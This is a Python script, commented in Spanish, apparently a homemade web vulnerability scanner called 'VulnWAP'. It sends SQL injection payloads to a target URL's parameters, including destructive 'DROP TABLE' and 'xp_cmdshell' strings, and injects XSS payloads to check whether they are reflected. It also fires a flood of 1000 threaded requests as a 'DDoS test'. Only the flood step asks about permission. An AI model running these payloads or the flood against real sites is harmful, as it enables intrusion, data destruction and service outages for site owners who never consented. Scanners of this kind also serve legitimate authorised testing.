import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def check_sql_injection(target_url):
    # Lista de payloads
    payloads = [
        "'", 
        '"', 
        '`',
        "' OR '1'='1", 
        "'; DROP TABLE testtable; --",
        "'; EXEC xp_cmdshell('cmd.exe')",
        "'; OR 1=1 --",
        "' OR 'x'='x",
        "') OR ('x'='x",
        "'; BEGIN TRANSACTION; DROP TABLE testtable; --",
        "; OR a=a",
        "0'XOR 1=1; --",
        "0' OR 1=1; #",
        "'; DROP TABLE IF EXISTS testtable; --",
        "'; CREATE TABLE testdata(data VARCHAR(50)); --",
        "'; EXEC xp_cmdshell('cmd.exe'); --"
    ]

    # Lista para almacenar resultados
    vulnerable_params = []

    # Extraer parámetros de la URL
    if "?" in target_url:
        parameters = target_url.split("?")[1].split("&")
    else:
        return "No hay parámetros en la URL proporcionada."

    # Iterar a través de los parámetros y payloads
    for param in parameters:
        for payload in payloads:
            # Construye la nueva URL probando el payload
            new_url = target_url.replace(param, param + payload)
            
            try:
                response = requests.get(new_url)

                # Verifica si hay errores comunes de SQL en la respuesta
                sql_errors = ["SQL syntax", "mysql_fetch", "nativecode=1064", "ODBC Microsoft Access Driver"]

                if any(error in response.text for error in sql_errors):
                    vulnerable_params.append(param.split("=")[0])
                    break  # No es necesario probar más payloads en este parámetro si ya encontró una vulnerabilidad
            except requests.RequestException:
                continue  # Si hay un error al hacer la solicitud, continúa con el siguiente payload

    if vulnerable_params:
        return f"Posible vulnerabilidad SQL encontrada en los parámetros: {', '.join(vulnerable_params)}"
    else:
        return "No se encontraron vulnerabilidades SQL evidentes."



def ddos_request(target_url):
    try:
        requests.get(target_url)
        return True
    except:
        return False

def check_ddos(target_url):
    num_requests = 1000
    failed_requests = 0
    
    with ThreadPoolExecutor(max_workers=500) as executor:
        results = list(executor.map(ddos_request, [target_url] * num_requests))
    
    failed_requests = results.count(False)
    
    if failed_requests > (num_requests / 2):  # Si más del 50% de las solicitudes fallaron
        return "El sitio puede ser vulnerable a ataques DDoS."
    else:
        return "El sitio parece ser resistente a ataques DDoS."

def check_xss(target_url):
    # Lista de payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<div onmouseover='alert(\"XSS\")'>Pasa el ratón por aquí</div>",
        "<body onload='alert(\"XSS\")'>",
        "<iframe src='javascript:alert(\"XSS\");'></iframe>",
        "\"><script>alert('XSS')</script>",
        "' onfocus='alert(\"XSS\")' autofocus='true'",
        "javascript:alert('XSS')",
        "\"><img src=x onmouseover=alert('XSS')>",
        "\"><a href='javascript:alert(\"XSS\")'>Click me!</a>"
    ]

    vulnerable_params = []
    csp_present = False
    csp_value = ""

    if "?" in target_url:
        parameters = target_url.split("?")[1].split("&")
    else:
        return "No hay parámetros en la URL proporcionada."

    for param in parameters:
        for payload in payloads:
            new_url = target_url.replace(param, param + payload)

            try:
                response = requests.get(new_url)
                
                # Comprobar si tiene CSP
                if 'Content-Security-Policy' in response.headers and not csp_present:
                    csp_present = True
                    csp_value = response.headers['Content-Security-Policy']
                
                soup = BeautifulSoup(response.text, "html.parser")

                if payload in str(soup):
                    vulnerable_params.append(param.split("=")[0])
                    break
            except requests.RequestException:
                continue

    report = ""

    if vulnerable_params:
        report += f"Posible vulnerabilidad XSS encontrada en los parámetros: {', '.join(vulnerable_params)}\n"
    else:
        report += "No se encontraron vulnerabilidades XSS evidentes.\n"
    
    if csp_present:
        report += f"La aplicación tiene un encabezado CSP: {csp_value}\n"
    else:
        report += "La aplicación no tiene un encabezado CSP.\n"

    return report

def check_csrf(target_url):
    # Código para detectar vulnerabilidades CSRF
    pass

def display_banner():
    banner = """
   .-''''''-.
  /  VulnWAP \\
 |            |
 |  o      o  |
 |  ||    ||  |
 '  ''    ''  '
  \  ------  /
   '-......-'
    """
    print(banner)


def main():
    display_banner()
    # Solicitar la URL objetivo
    target_url = input("Introduce la URL objetivo: ")

    # SQLi
    print("\n[+] Comprobando SQL Injection...")
    sqli_result = check_sql_injection(target_url)
    print(sqli_result)

    # DDoS (Preguntar si tiene permiso)
    ddos_permission = input("\n¿Tienes permiso para realizar una prueba de robustez DDoS? (s/n): ")
    if ddos_permission.lower() == 's':
        print("\n[+] Comprobando resistencia a DDoS...")
        ddos_result = check_ddos(target_url)
        print(ddos_result)

    # XSS
    print("\n[+] Comprobando Cross-Site Scripting (XSS)...")
    xss_result = check_xss(target_url)
    print(xss_result)

    # Compilando el informe
    report = "\n----- INFORME FINAL -----\n"
    report += "\n[SQLi]\n" + sqli_result
    if ddos_permission.lower() == 's':
        report += "\n[DDoS]\n" + ddos_result
    report += "\n[XSS]\n" + xss_result

    print(report)

    # Opcionalmente, guardar este informe en un archivo
    save_option = input("\n¿Deseas guardar el informe en un archivo? (s/n): ")
    if save_option.lower() == 's':
        with open("report.txt", "w") as file:
            file.write(report)
        print("Informe guardado en 'report.txt'")


main()

